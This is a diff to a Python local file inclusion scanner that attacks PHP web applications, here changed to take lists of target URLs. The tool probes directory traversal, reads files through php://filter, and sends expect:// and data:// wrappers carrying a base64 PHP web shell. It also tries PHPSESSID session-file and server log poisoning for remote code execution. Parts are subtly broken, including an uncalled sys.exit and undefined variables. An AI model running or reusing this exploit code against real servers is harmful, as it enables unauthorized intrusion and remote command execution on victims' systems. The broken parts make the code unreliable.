@@ -1,6 +1,7 @@
 from UAList import fetchUA
 import re
 import requests
+import sys
 from urllib.parse import quote
 from termcolor import colored
 
@@ -22,7 +23,7 @@ class Payload:
 		# Headers. One is without url encoding beacause it encodes also the base64 and the server doesn't like that
 		self.phpHeaders = [quote("expect://id"), "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=&cmd=id"]
 
-		# PHPSESSID Cooki
+		# PHPSESSID Cookie
 		self.cookiePath = "/var/lib/php/sessions/sess_"
 
 		# payload for RCE
@@ -30,23 +31,53 @@ class Payload:
 		if initiate:
 			self.Attack()
 
-	def Attack(self):
-		if self.urlCheck():
-			self.dirTraversalCheck()
-			self.headerCheck()
-			self.filterCheck()
-			self.cookieCheck()
-			self.logPoisonCheck()
 
+
+
+	def Attack(self):
+		if self.checkArgs():
+			sys.exit
+		else:
+			if type(self.url) == list:
+				for listt in self.url:
+					if self.urlCheck(listt.strip()):
+						self.dirTraversalCheck(listt.strip())
+						self.headerCheck(listt.strip())
+						self.filterCheck(listt.strip())
+						self.cookieCheck(listt.strip())
+						self.logPoisonCheck(listt.strip())
+			else:
+				url = self.url
+				print(url)
+				if self.urlCheck(url):
+					self.dirTraversalCheck(url)
+					self.headerCheck(url)
+					self.filterCheck(url)
+					self.cookieCheck(url)
+					self.logPoisonCheck(url)
+			
+			
+			
+			
+	def checkArgs(self):
+		if len(sys.argv) == 1:
+			print(colored('[-]', 'red', attrs=['bold']) + ' error: missing a mandatory option (-u or -L). Use -h for more information')
+			
+			
+			
+				
 	def hit(self, url):
 		response = requests.get(url, headers=fetchUA())
 		response = response.text
 		return self.stripHtmlTags(response)
 
+
+
+
 	# Checks if the url is valid
-	def urlCheck(self):
+	def urlCheck(self,i):	
 		try:
-			ret = requests.get(self.url, headers=fetchUA())
+			ret = requests.get(i, headers=fetchUA())
 			if ret.status_code == 200:
 				return True
 			else:
@@ -69,10 +100,10 @@ class Payload:
 		
 
 	# Checks for directory traversal
-	def dirTraversalCheck(self):
+	def dirTraversalCheck(self,listt):
 		for i in self.linux_dirTraversal:
 			for n in self.poc:
-				compUrl = self.url + i + n
+				compUrl = listt + i + n
 				if self.verbosity > 1:
 					print(colored('[*]', 'yellow', attrs=['bold']) + f' Testing: {compUrl}')
 				clean = self.hit(compUrl)
@@ -86,9 +117,9 @@ class Payload:
 
 
 	# Checks for Remote Code Execution with php headers
-	def headerCheck(self):
+	def headerCheck(self,listt):
 		for header in self.phpHeaders:
-			compUrl = self.url + header
+			compUrl = listt + header
 			if self.verbosity > 1:
 				print(colored('[*]', 'yellow', attrs=['bold']) + f' Testing: {compUrl}')
 			clean = self.hit(compUrl)
@@ -100,9 +131,9 @@ class Payload:
 
 	
 	# Checks if it can retrieve files with the php filter	
-	def filterCheck(self):
+	def filterCheck(self,listt):
 		for path in self.filterPaths:
-			compUrl = self.url + self.filterBase + path
+			compUrl = listt + self.filterBase + path
 			if self.verbosity > 1:
 				print(colored('[*]', 'yellow', attrs=['bold']) + f' Testing: {compUrl}')
 			clean = self.hit(compUrl)
@@ -122,21 +153,21 @@ class Payload:
 
 
 	# Checks if the PHPSESSID cookie can be exploited
-	def cookieCheck(self):
+	def cookieCheck(self,listt):
 		if self.verbosity > 1:
 			print(colored('[*]', 'yellow', attrs=['bold']) + ' Testing: PHPSESSID cookie injection')
 		s = requests.Session()
-		session = s.get(self.url, headers=fetchUA())
+		session = s.get(listt, headers=fetchUA())
 		cookies = session.cookies.get_dict()
 		for cookie in cookies:
 			if 'phpsessid' in cookie.lower():
 				# it gets the value of the cookie
 				value = session.cookies[i]
 				#send the payload to see if there is RCE
-				newUrl = self.url + self.payload
+				newUrl = listt + self.payload
 				s.get(newUrl, headers=fetchUA())
 				# open the file to find if the command worked
-				compUrl = self.url + self.cookiePath + value + "&cmd=id"
+				compUrl = listt + self.cookiePath + value + "&cmd=id"
 				clean = self.hit(compUrl)	
 				if 'uid='  in clean.lower():
 					print(colored('[+]', 'green', attrs=['bold']) + ' Remote code execution (RCE) found with the PHPSESSID cookie and the file ' + cookiePath + '[cookie value] can be poisoned')
@@ -145,9 +176,9 @@ class Payload:
 						print(colored('[-]', 'red', attrs=['bold']) + f' {compUrl} payload failed')
 
 
-	def logPoisonCheck(self):
+	def logPoisonCheck(self,listt):
 		headers = {"User-Agent": self.payload}
-		response = requests.get(self.url, headers=fetchUA())
+		response = requests.get(listt, headers=fetchUA())
 		if self.verbosity > 1:
 			print(colored('[*]', 'yellow', attrs=['bold']) + ' Testing: Log Poisoning based on server type.')
 		# checks the type of the server
@@ -158,7 +189,7 @@ class Payload:
 			logPath = [quote("/var/log/apache2/access.log"), quote("/var/log/sshd.log"), quote("/var/log/mail"), quote("/var/log/vsftpd.log"), quote("/proc/self/environ")]
 			for d_path in self.linux_dirTraversal:
 				for l_path in logPath:
-					pathth = self.url + d_path + l_path
+					pathth = listt + d_path + l_path
 					compUrl = pathth + "&cmd=id"
 					clean = self.hit(compUrl)
 					if "uid=" in clean.lower():
@@ -172,9 +203,9 @@ class Payload:
 			if self.verbosity > 1:
 				print(colored('[*]', 'yellow', attrs=['bold']) + ' Server Identified as NGINX')
 			log = [quote("/var/log/nginx/error.log"), quote("/var/log/nginx/access.log")]
-			for d_path in linux_dirTraversal:
+			for d_path in self.linux_dirTraversal:
 				for l_path in log:
-					pathh = self.url + d_path + l_path
+					pathh = listt + d_path + l_path
 					compUrl = pathh + "&cmd=id"
 					clean = self.hit(compUrl)
 					if "uid=" in clean.lower():
